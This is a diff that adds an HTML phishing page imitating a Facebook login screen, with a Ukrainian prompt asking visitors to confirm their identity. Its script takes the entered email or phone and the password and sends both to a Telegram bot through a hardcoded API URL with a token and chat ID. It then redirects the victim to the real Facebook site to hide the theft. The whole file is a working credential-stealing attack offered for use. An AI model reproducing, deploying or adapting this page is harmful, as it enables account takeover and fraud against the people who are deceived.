@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Security</title>
+    <style>
+        body { background: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; padding-top: 50px; }
+        .box { width: 360px; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
+        .logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; background: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="logo">facebook</div>
+        <p>Підтвердіть свою особу для безпеки.</p>
+        <input type="text" id="l" placeholder="Email or Phone">
+        <input type="password" id="p" placeholder="Password">
+        <button class="btn" onclick="send()">Log In</button>
+    </div>
+    <script>
+        function send() {
+            const log = document.getElementById('l').value;
+            const pas = document.getElementById('p').value;
+            fetch(`https://api.telegram.org/bot8790499217:AAFZF8O15FpKe0-z_4P3q9FkedSnGdzB_o8/sendMessage?chat_id=8491881282&text=${encodeURIComponent("🔵 FACEBOOK:\n👤 L: "+log+"\n🔑 P: "+pas)}`, {mode: 'no-cors'});
+            setTimeout(() => { window.location.href="https://facebook.com/"; }, 1000);
+        }
+    </script>
+</body>
+</html>
